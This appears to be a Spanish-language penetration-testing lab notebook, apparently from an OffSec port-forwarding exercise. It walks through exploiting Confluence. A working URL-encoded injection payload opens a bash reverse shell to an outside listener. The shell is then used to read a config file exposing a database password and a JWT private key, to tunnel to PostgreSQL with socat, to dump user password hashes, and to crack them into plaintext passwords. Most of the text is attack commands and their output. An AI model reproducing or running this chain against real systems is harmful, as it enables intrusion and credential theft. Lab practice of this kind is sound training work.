# {CATEGORÍA}: {DESCRIPCIÓN}

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Conexion a Confluence y preparacion escenario:
1. Curl
```bash
curl http://192.168.129.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.213/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```
2. En el receptor:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.129.63] 36656
bash: cannot set terminal process group (2562): Inappropriate ioctl for device
bash: no job control in this shell
bash: /root/.bashrc: Permission denied
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
    <property name="access.mode">READ_WRITE</property>
    <property name="admin.ui.allow.daily.backup.custom.location">false</property>
    <property name="admin.ui.allow.manual.backup.download">false</property>
    <property name="admin.ui.allow.site.support.email">false</property>
    <property name="atlassian.license.message">AAABmQ0ODAoPeNqFkk9vozAQxe/+FEi9dA9EBtr8kywtNaRNC2RbklV2lYtLJsEqMalt0tJPvwYSR a206s2esea99xtfTCS3UthbeGQ51+Nrb4w9iwZzy8Wui16g/g1S8VIQp4/xAA89z0G0FJplOmE7I FxokIIVPS7WldKSg/q53TFe9LJyh7JSbHrmKT8A0bIC9KuSWc4UBEwDaSRsPLIdjCKegVAQvu+5r M9NBzfNo14Ym7HfCKYgDyCnAblZ3l/ZD4M/V7Z7M5nbibNYoKITuWMqJzF9o5NJ9vE33eZ9z10WO l/Et4/35WOcCD9f+/mTfxtFs7eiXr6M+neDh3ALrzVdy0AJf0VWpAtnvDIKjacuYFo9q0zyvW6Yt RXj2rQFE9l/4rVzkmr3DHK2WSjDm9hOV001k83oDSsUnCCZdNE0SMPEjpyhWcnQGyJzI58rM7llg ivWGpkeoSEqoa185d+qHefP6z20u6WzOA6f6NSPTuhOn8FFAZxjmv1sigpMQOuy4WF1QH6sxlZ4Y EXVKqLzsePyD3Bw00kwLAIUD/v++WJ60P9dkGxYvI4p+h+Ka3sCFBvxkCWPaetLPFx1y3nbjsiLk awEX02jn</property>
    <property name="attachments.dir">${confluenceHome}/attachments</property>
    <property name="confluence.setup.server.id">BXJ4-K7Y4-2BFT-N1UU</property>
    <property name="confluence.webapp.context.path"></property>
    <property name="hibernate.c3p0.acquire_increment">1</property>
    <property name="hibernate.c3p0.idle_test_period">100</property>
    <property name="hibernate.c3p0.max_size">60</property>
    <property name="hibernate.c3p0.max_statements">0</property>
    <property name="hibernate.c3p0.min_size">20</property>
    <property name="hibernate.c3p0.timeout">30</property>
    <property name="hibernate.c3p0.validate">true</property>
    <property name="hibernate.connection.driver_class">org.postgresql.Driver</property>
    <property name="hibernate.connection.isolation">2</property>
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.129.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
    <property name="hibernate.database.lower_non_ascii_supported">true</property>
    <property name="hibernate.dialect">com.atlassian.confluence.impl.hibernate.dialect.PostgreSQLDialect</property>
    <property name="hibernate.setup">true</property>
    <property name="jwt.private.key">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</property>
    <property name="jwt.public.key">MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAnLM8hAlwhDjo4NF08TvomjBewWkWdoTPXc4uWdxfT1RhBN+dFYoTFsfuRJv30uuBjOVnVkAIkUwFfwUjXr4LOXlyYkKThvjO7pSrwxrOfZKk0OS0vfX2bRzgXHoUtL8/gWLsNzSDxt7EtDRRU1g2jqAeYYBAxSMvpYLFuQHN4ebuNrzyTpZBJoKkIJBOIUcHDuWerYBJYXPE/VicL79NGSklUr1aPjvuVZy6Vjo3u+G0PP2Osa1Zpawt2FZ03thseOjD7d0oKvmz2clAXAAWJDB4ZEPMzNBKm3AsBb/bv89iFAgSLJ1GU+zpTxq38KNvGdGqrqh68LwLXqWe3NOD5fteOgQIlHOI+zO37TdXowZGk2hLzgaQNfzbYEefd8AXF1XbIRhO+6Ewvfgzf5J5iUxxm3+GKzUj4e7rusJfegT3L9Xu/GBHh8kQ/dEYyjOY3RVzw1GYkUr4FSOyHY5to6ReZ4BB6jAycPTM82GwpDTUXvY3xEV01jCCcSoLY5gzAgMBAAE=</property>
    <property name="lucene.index.dir">${localHome}/index</property>
    <property name="synchrony.encryption.disabled">true</property>
    <property name="synchrony.proxy.enabled">true</property>
    <property name="webwork.multipart.saveDir">${localHome}/temp</property>
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```
#### Paso 2: Conexion con socat a base de datos:
```bash
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.129.215:5432
<cat -ddd TCP-LISTEN:2345,fork TCP:10.4.129.215:5432                                                                                                                                                              
2025/06/30 16:13:15 socat[3449] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org                                                                                                             
2025/06/30 16:13:15 socat[3449] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)                                                       
2025/06/30 16:13:15 socat[3449] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)                                                                                                        
2025/06/30 16:13:15 socat[3449] I setting option "fork" to 1                                                                                                                                                      
2025/06/30 16:13:15 socat[3449] I socket(2, 1, 6) -> 5                                                                                                                                                            
2025/06/30 16:13:15 socat[3449] I starting accept loop                                                                                                                                                            
2025/06/30 16:13:15 socat[3449] N listening on AF=2 0.0.0.0:2345                                                                                                                                                  
2025/06/30 16:14:47 socat[3449] I accept(5, {2, AF=2 192.168.45.213:52112}, 16) -> 6                                                                                                                              
2025/06/30 16:14:47 socat[3449] N accepting connection from AF=2 192.168.45.213:52112 on AF=2 192.168.129.63:2345                                                                                                 
2025/06/30 16:14:47 socat[3449] I permitting connection from AF=2 192.168.45.213:52112                                                                                                                            
2025/06/30 16:14:47 socat[3449] N forked off child process 3486                                                                                                                                                   
2025/06/30 16:14:47 socat[3449] I close(6)                                                                                                                                                                        
2025/06/30 16:14:47 socat[3449] I still listening                                                                                                                                                                 
2025/06/30 16:14:47 socat[3449] N listening on AF=2 0.0.0.0:2345
```
* En kali
```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# psql -h 192.168.129.63 -p 2345 -U postgres                  
Password for user postgres: D@t4basePassw0rd! 
psql (17.4 (Debian 17.4-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=# 
```

#### Paso 3: Dump base de datos:

* Database select
```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# psql -h 192.168.129.63 -p 2345 -U postgres                  
Password for user postgres: 
psql (17.4 (Debian 17.4-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
Type "help" for help.

postgres=# \l
                                                      List of databases
    Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges   
------------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 confluence | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | 
 postgres   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | 
 template0  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
            |          |          |                 |             |             |        |           | postgres=CTc/postgres
 template1  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
            |          |          |                 |             |             |        |           | postgres=CTc/postgres
(4 rows)

postgres=# \c confluence
psql (17.4 (Debian 17.4-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
You are now connected to database "confluence" as user "postgres".
confluence=# select * from cwd_user;
```

* Dump
```bash
   id   |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
--------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
 229377 | admin          | admin           | T      | 2022-09-09 21:10:26.365 | 2022-09-09 21:10:26.365 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | d9da2333-8bd1-4a8e-82d3-0613aead5d22 |        98305 | {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
 229378 | trouble        | trouble         | T      | 2022-09-09 21:13:04.598 | 2022-09-09 21:13:04.598 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 84bcf8cf-618d-4bec-b5c0-1b4a21fbcd6b |        98305 | {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
 229379 | happiness      | happiness       | T      | 2022-09-09 21:13:35.831 | 2022-09-09 21:13:35.831 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | 8b9c660a-cfee-48ac-8214-737df1786dd2 |        98305 | {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
 229380 | hr_admin       | hr_admin        | T      | 2022-09-09 21:13:58.548 | 2022-09-09 21:13:58.548 | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 0d31acb5-ba51-4725-ae64-ae7f5d51becc |        98305 | {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
 229381 | database_admin | database_admin  | T      | 2022-09-09 21:14:22.459 | 2022-09-09 21:14:22.459 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 93d97033-f7d4-4a3c-80f4-55cc5faf03c7 |        98305 | {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
 229382 | rdp_admin      | rdp_admin       | T      | 2022-09-09 21:14:46.153 | 2022-09-09 21:14:46.153 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | a8f8d9b5-dfcb-480b-b461-8efce939294c |        98305 | {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
(6 rows)

```
* hashes:
```
admin          : {PKCS5S2}3vfgC35A7Gnrxlzbvp32yM8zXvdE8U8bxS9bkP+3aS3rnSJxz4bJ6wqtE8d95ejA
trouble        : {PKCS5S2}tnbti4h38VDOh0xPrBHr7JBYjev7wws+ETHL1YyjSpIWVUz+66zXwDvbBJkJz342
happiness      : {PKCS5S2}1hCLEv054BGYa9QkCAZKSmotKb4d8WbuDc/gGxHngs0cL3+fJ4OmCt6+fUM6HYlc
hr_admin       : {PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R
database_admin : {PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv
rdp_admin      : {PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP
```
* Crackeo de hashes:
```bash
┌──(root㉿kali)-[/home/kali/OffSec/19-PortForwarding-SSHTunneling/19.2.3-PortForwarding-Socat]
└─# hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-skylake-avx512-Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz, 14879/29823 MB (4096 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 6 digests; 6 unique digests, 6 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

INFO: Removed hash found as potfile entry.

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/fasttrack.txt
* Passwords.: 262
* Bytes.....: 2430
* Keyspace..: 262

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 12001 (Atlassian (PBKDF2-HMAC-SHA1))
Hash.Target......: hashes.txt
Time.Started.....: Mon Jun 30 13:38:22 2025 (0 secs)
Time.Estimated...: Mon Jun 30 13:38:22 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/fasttrack.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     5117 H/s (0.54ms) @ Accel:512 Loops:128 Thr:1 Vec:16
Recovered........: 3/6 (50.00%) Digests (total), 2/6 (33.33%) Digests (new), 3/6 (50.00%) Salts
Progress.........: 1572/1572 (100.00%)
Rejected.........: 0/1572 (0.00%)
Restore.Point....: 262/262 (100.00%)
Restore.Sub.#1...: Salt:5 Amplifier:0-1 Iteration:9984-9999
Candidate.Engine.: Device Generator
Candidates.#1....: Spring2017 -> starwars
Hardware.Mon.#1..: Temp: 47c Util: 19%

Started: Mon Jun 30 13:38:18 2025
Stopped: Mon Jun 30 13:38:24 2025
```
* passwords obtenidas:

|user | password |
|-----|----------|
|hr_admin | Welcome1234 |
|rdp_admin | P@ssw0rd! |
|database_admin | sqlpass123 |
## Troubleshooting
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

